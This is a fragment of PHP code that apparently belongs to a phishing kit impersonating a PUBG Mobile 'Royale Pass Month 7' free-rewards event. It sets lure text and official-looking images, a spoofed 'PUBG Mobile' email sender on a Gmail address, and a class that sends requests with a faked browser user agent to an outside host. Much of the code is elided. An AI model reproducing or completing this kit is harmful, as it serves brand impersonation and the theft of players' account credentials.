...
$title = 'PUBG MOBILE: Royale Pass Month 7';
$description = 'Collect your special rewards at the Royale Pass Month 7 event. This opportunity is limited and without the need for topup. Collect your rewards now!';
$copyright = 'PUBG MOBILE';
$theme = '#000';
$image = 'https://www.pubgmobile.com/images/event/royalepassm7/share.jpg';
$icon = 'https://www.pubgmobile.com/common/images/icon_logo.jpg';


$author = '@BERBAGISC';
$sender = 'From: PUBG Mobile sc <sendgrid.me@gmail.com>';
...
class get_flag {
    ...
    $agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
        ...
        $ch = curl_init('https://apiserver-bgmi.my.id/');
